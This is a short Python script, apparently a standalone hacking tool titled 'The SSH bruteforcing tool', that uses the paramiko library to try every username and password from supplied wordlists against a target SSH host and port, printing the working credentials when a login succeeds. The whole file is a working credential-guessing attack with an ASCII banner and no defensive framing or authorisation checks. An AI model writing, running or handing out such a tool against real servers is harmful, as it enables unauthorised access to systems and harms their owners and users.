from colorama import Fore
import paramiko
import argparse
import os


def banner():
    print(f"""{Fore.WHITE}
          
          The SSH bruteforcing tool
{Fore.BLUE}
          
            ░█▀▀░█▀▀░█░█░░░█▀▄░█▀▄░█░█░▀█▀░█▀▀░█▀▀░█▀█░█▀▄░█▀▀░█▀▀
            ░▀▀█░▀▀█░█▀█░░░█▀▄░█▀▄░█░█░░█░░█▀▀░█▀▀░█░█░█▀▄░█░░░█▀▀
            ░▀▀▀░▀▀▀░▀░▀░░░▀▀░░▀░▀░▀▀▀░░▀░░▀▀▀░▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀


          {Fore.WHITE}
""")
def clear():
    if os.name=="nt":
        os.system("cls")
    else:
        os.system("clear")

def brute(args,username, password):
    ssh=paramiko.SSHClient()
    #load ssh host keys
    ssh.load_system_host_keys()
    #add ssh host key automattically for if need
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
    #connect to target
        ssh.connect(args.target,args.port,username,password, timeout=50)

        session=ssh.get_transport().open_session()

        if session.active:
            clear()
            banner()

            print(f'{Fore.BLUE}The{Fore.YELLOW} {username} {Fore.BLUE}and {Fore.YELLOW}{password}{Fore.BLUE} is correct...')
            ssh.close()
            exit()
        else:

            print(f'{Fore.RED}The {username} and {password} is not correct...')

    except paramiko.AuthenticationException:
        print(f'{Fore.RED}{username} and {password} is not correct')
        return False
    except paramiko.SSHException as e:
        print(f'{Fore.RED}SSH error: {e}')
        return False
    except Exception as e:
        print(f'{Fore.RED}Error: {e}')
        return False
    finally:
        ssh.close()


if __name__== '__main__':

    banner()
    print("""#Help of the command
1. sshbrute.py -t [ip] -p [port] -u [username] or -U [username-wordlist] -l [password] or -P [password-wordlist]
""")
   
    parser = argparse.ArgumentParser(description="SSH brute forceing Tool")
    
    parser.add_argument("-t","--target", required=True,help= "Enter the target ip or name")
    parser.add_argument("-p","--port", type=int,default=22,help="Port number")
    parser.add_argument("-u","--username", help = "Enter the username")
    parser.add_argument("-U","--Username", help="Enter the username wordlist")
    parser.add_argument("-l","--password",help="Enter the password")
    parser.add_argument("-P","--Password", help="Enter the password wordlist path")
    args = parser.parse_args()

    if args.username:
        usernames=[args.username]
    elif args.Username:
        with open(args.Username,"r") as f:
            usernames=[line.strip() for line in f]
    else:
        print(f"{Fore.RED} The username or wordlist not correct")
    
    if args.password:
        passwords=[args.password]
    elif args.Password:
        with open(args.Password,"r") as f:
            passwords=[line.strip() for line in f]
    else:
        print(f"{Fore.RED} The Password or wordlist not correct")
       
        
    for i in usernames:
        for j in passwords:
            print(f"{Fore.BLUE}Bruteforcing {i} and {j} ....")
            brute(args,i,j)
        
    
   

